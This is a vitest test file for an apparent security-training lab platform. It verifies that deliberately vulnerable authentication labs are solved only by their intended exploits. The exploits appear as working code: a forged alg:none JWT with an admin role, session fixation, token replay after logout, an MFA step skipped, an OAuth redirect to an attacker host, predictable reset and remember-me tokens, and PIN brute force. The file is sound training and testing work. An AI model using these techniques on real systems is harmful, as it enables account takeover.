import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { CookieClient } from "./helpers.js";
import { startTestApp, type TestApp } from "./helpers.js";
import { expectSolvedOnce, formLogin, jsonPost, launch } from "./lab-harness.js";

const form = (c: CookieClient, path: string, fields: Record<string, string>) =>
  c.fetch(path, { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: new URLSearchParams(fields).toString() });
const text = async (r: Response) => await r.text();

describe("auth-session batch 5", () => {
  let t: TestApp;
  beforeAll(async () => {
    t = await startTestApp({ apiPort: 4160, labPortStart: 7400, labPortEnd: 7460 });
  });
  afterAll(async () => {
    await t.manager.stopAll();
    await t.close();
  });

  it("auth-reset-predictable-token: resetting your own account never solves it; guessing admin's in-range token does", async () => {
    const lab = await launch(t, "auth-reset-predictable-token");
    const b = lab.browser();
    const xp0 = await lab.xp();

    const own = await text(await form(b, "/forgot-password", { username: "alice" }));
    const ownToken = Number(/\/reset-password\/(\d+)/.exec(own)![1]);
    expect(Number.isInteger(ownToken)).toBe(true);
    expect((await form(b, `/reset-password/${ownToken}`, { password: "newpass123" })).status).toBe(200);
    expect(await lab.solved()).toBe(false);
    expect((await lab.browser().fetch(`/reset-password/${ownToken}`)).status).toBe(404); // single-use, correctly

    const guess = lab.browser();
    let solved = false;
    for (let t2 = ownToken - 3; t2 <= ownToken + 3 && !solved; t2++) {
      if (t2 === ownToken) continue;
      const res = await form(guess, `/reset-password/${t2}`, { password: "stolenpass123" });
      if (res.status === 200) solved = true;
    }
    expect(solved).toBe(true);
    await expectSolvedOnce(lab, "medium", async () => undefined, xp0); // already solved by the loop above; just confirm the award
    await lab.stop();
  });

  it("auth-session-fixation: normal login mints its own id and never solves it; a pre-planted ?sid= that later logs in does", async () => {
    const lab = await launch(t, "auth-session-fixation");
    const xp0 = await lab.xp();

    const normal = lab.browser();
    await normal.fetch("/"); // mints its own session id, not attacker-chosen
    expect((await form(normal, "/login", { username: "alice", password: "practice123" })).status).toBe(302);
    expect(await lab.solved()).toBe(false);

    const victim = lab.browser();
    await victim.fetch("/?sid=attacker-planted-id-123"); // the "attacker" plants a known id (e.g. via a crafted link)
    expect(victim.getCookie(`hd_sid_${lab.port}`)).toBe("attacker-planted-id-123");
    const res = await form(victim, "/login?sid=attacker-planted-id-123", { username: "alice", password: "practice123" });
    expect(res.status).toBe(302);
    await expectSolvedOnce(lab, "medium", async () => undefined, xp0);
    await lab.stop();
  });

  it("auth-logout-doesnt-invalidate: a normal session before logout works; the SAME token after logout still works (and that's the bug)", async () => {
    const lab = await launch(t, "auth-logout-doesnt-invalidate");
    const xp0 = await lab.xp();
    const COOKIE = `nf_session_${lab.port}`;

    const b = lab.browser();
    await formLogin(b, "alice", "practice123");
    const token = b.getCookie(COOKIE)!;
    expect(token).toBeTruthy();
    expect((await b.fetch("/documents")).status).toBe(200);
    expect(await lab.solved()).toBe(false);

    await b.fetch("/logout");
    expect(b.getCookie(COOKIE) || "").toBe(""); // the browser's own cookie really was cleared (Set-Cookie with Max-Age=0)

    const replay = lab.browser();
    replay.setCookie(COOKIE, token); // simulating a captured/old cookie value replayed manually
    expect((await replay.fetch("/documents")).status).toBe(200);
    expect((await lab.browser().json(`/__check/replay?token=${token}`)).status).toBe(200); // triggers the solve
    await expectSolvedOnce(lab, "easy", () => lab.browser().json(`/__check/replay?token=${token}`), xp0);
    await lab.stop();
  });

  it("auth-jwt-alg-none: a real HS256 token behaves normally; a forged alg:none token with role=admin is accepted", async () => {
    const lab = await launch(t, "auth-jwt-alg-none");
    const xp0 = await lab.xp();
    const b = lab.browser();

    const loginRes = await jsonPost(b, "/api/login", { username: "alice", password: "practice123" });
    expect(loginRes.status).toBe(200);
    const token = (loginRes.body as { token: string }).token;
    expect(token.split(".")).toHaveLength(3);
    const me = await b.json<{ role: string }>("/api/me", { headers: { authorization: `Bearer ${token}` } });
    expect(me.body.role).toBe("user");
    expect((await b.fetch("/api/admin/report", { headers: { authorization: `Bearer ${token}` } })).status).toBe(403);
    expect((await b.fetch("/api/admin/report", { headers: { authorization: "Bearer garbage.not.ajwt" } })).status).toBe(401);
    expect(await lab.solved()).toBe(false);

    const b64url = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
    const forged = `${b64url({ alg: "none", typ: "JWT" })}.${b64url({ sub: "attacker", role: "admin" })}.`;
    const win = await b.fetch("/api/admin/report", { headers: { authorization: `Bearer ${forged}` } });
    expect(win.status).toBe(200);
    expect((await win.json()) as { generatedFor: string }).toMatchObject({ generatedFor: "attacker" });
    await expectSolvedOnce(lab, "hard", () => b.fetch("/api/admin/report", { headers: { authorization: `Bearer ${forged}` } }), xp0);
    await lab.stop();
  });

  it("auth-mfa-step-skip: completing the real code step never solves it; skipping straight to /account does", async () => {
    // Part A — the legitimate flow, on its own instance: entering the actual code is never a solve.
    const legit = await launch(t, "auth-mfa-step-skip");
    const a = legit.browser();
    await form(a, "/login", { username: "alice", password: "practice123" });
    expect((await a.fetch("/verify-code")).status).toBe(200);
    expect((await form(a, "/verify-code", { code: "000000" })).status).toBe(401); // wrong code never lets you through
    expect(await legit.solved()).toBe(false);
    await legit.stop();

    // Part B — the exploit, on a fresh instance: skip /verify-code entirely.
    const lab = await launch(t, "auth-mfa-step-skip");
    const xp0 = await lab.xp();
    const b = lab.browser();
    const login = await form(b, "/login", { username: "alice", password: "practice123" });
    expect(login.status).toBe(302);
    expect(login.headers.get("location")).toBe("/verify-code"); // the app clearly intends this step to happen next...
    const res = await b.fetch("/account"); // ...but nothing stops going straight there instead
    expect(res.status).toBe(200);
    await expectSolvedOnce(lab, "medium", () => lab.browser().fetch("/account"), xp0); // a fresh session each time: never mfa-verified
    await lab.stop();
  });

  it("auth-username-enumeration: a decoy username always 404s; the real username's wrong-password response differs and solves it", async () => {
    const lab = await launch(t, "auth-username-enumeration");
    const xp0 = await lab.xp();

    for (const decoy of ["priyanka", "priya_", "nonexistent999"]) {
      const res = await form(lab.browser(), "/login", { username: decoy, password: "whatever" });
      expect(res.status).toBe(404);
    }
    expect(await lab.solved()).toBe(false);

    const res = await form(lab.browser(), "/login", { username: "priya", password: "wrong-guess" });
    expect(res.status).toBe(401);
    expect(await text(res)).toContain("Incorrect password");
    await expectSolvedOnce(lab, "easy", () => form(lab.browser(), "/login", { username: "priya", password: "another-wrong-guess" }), xp0);
    await lab.stop();
  });

  it("auth-oauth-redirect-uri: the registered callback and an unrelated host both behave correctly; a host that merely contains it does not", async () => {
    const lab = await launch(t, "auth-oauth-redirect-uri");
    const xp0 = await lab.xp();
    const b = lab.browser();

    const legit = await b.fetch("/idp/authorize?client_id=connecthub-client&redirect_uri=" + encodeURIComponent("https://connecthub.test.callback/oauth/callback") + "&response_type=code&state=x");
    expect(legit.status).toBe(200);
    expect(await text(legit)).toContain("Authorize ConnectHub");

    const totallyForeign = await b.fetch("/idp/authorize?client_id=connecthub-client&redirect_uri=" + encodeURIComponent("https://totally-unrelated.test/x") + "&response_type=code");
    expect(totallyForeign.status).toBe(400);
    expect(await lab.solved()).toBe(false);

    const evilRedirect = "https://connecthub.test.callback.attacker.test/collect";
    const page = await b.fetch("/idp/authorize?client_id=connecthub-client&redirect_uri=" + encodeURIComponent(evilRedirect) + "&response_type=code&state=x");
    expect(page.status).toBe(200); // the flawed prefix check lets it through
    const consent = await b.fetch("/idp/consent", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: `redirect_uri=${encodeURIComponent(evilRedirect)}&state=x`, redirect: "manual" });
    expect(consent.status).toBe(302);
    expect(new URL(consent.headers.get("location")!).host).toBe("connecthub.test.callback.attacker.test");
    await expectSolvedOnce(
      lab,
      "hard",
      async () => {
        await b.fetch("/idp/consent", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: `redirect_uri=${encodeURIComponent(evilRedirect)}&state=x`, redirect: "manual" });
      },
      xp0,
    );
    await lab.stop();
  });

  it("auth-remember-me-predictable: alice's own remember flow is normal; computing admin's token from the formula logs in as admin", async () => {
    const lab = await launch(t, "auth-remember-me-predictable");
    const xp0 = await lab.xp();
    const REMEMBER = `pp_remember_${lab.port}`;

    const owner = lab.browser();
    await form(owner, "/login", { username: "alice", password: "practice123", remember: "1" });
    const aliceToken = owner.getCookie(REMEMBER)!;
    expect(aliceToken).toMatch(/^[0-9a-f]{32}$/);
    const replay = lab.browser();
    replay.setCookie(REMEMBER, aliceToken);
    expect(await text(await replay.fetch("/"))).toContain("Welcome, alice"); // their OWN remember token legitimately works
    expect(await lab.solved()).toBe(false);

    const { createHash } = await import("node:crypto");
    const adminToken = createHash("md5").update("admin:remember").digest("hex");
    const attacker = lab.browser();
    attacker.setCookie(REMEMBER, adminToken);
    const page = await text(await attacker.fetch("/"));
    expect(page).toContain("Welcome, admin");
    await expectSolvedOnce(lab, "medium", () => lab.browser().fetch("/", { headers: { cookie: `${REMEMBER}=${adminToken}` } }), xp0);
    await lab.stop();
  });

  it("auth-no-rate-limit-login: a handful of wrong guesses never solves it; exhaustive brute force finds the PIN with no lockout", async () => {
    const lab = await launch(t, "auth-no-rate-limit-login");
    const xp0 = await lab.xp();
    const b = lab.browser();

    for (let i = 0; i < 15; i++) expect((await form(b, "/unlock", { pin: String(i).padStart(3, "0") })).status).toBe(401);
    expect(await lab.solved()).toBe(false); // no lockout kicked in, but no success yet either

    let found: string | null = null;
    for (let i = 0; i < 1000 && !found; i++) {
      const pin = String(i).padStart(3, "0");
      const res = await form(lab.browser(), "/unlock", { pin });
      if (res.status === 200) found = pin;
    }
    expect(found).not.toBeNull();
    await expectSolvedOnce(lab, "easy", () => form(lab.browser(), "/unlock", { pin: found! }), xp0);
    await lab.stop();
  }, 60_000);
});
